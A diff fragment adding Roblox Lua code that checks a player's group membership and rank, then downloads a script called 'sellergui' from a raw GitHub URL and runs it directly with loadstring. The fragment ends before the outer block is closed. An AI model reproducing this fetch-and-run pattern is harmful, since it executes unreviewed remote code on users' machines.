@@ -1,0 +1,4 @@
+if game.Players.LocalPlayer:IsInGroup(14345336) then 
+    if game.Players.LocalPlayer:GetRankInGroup(14345336) == 50 then 
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/sencymrll/momluvsu/main/sellergui'))() 
+    end
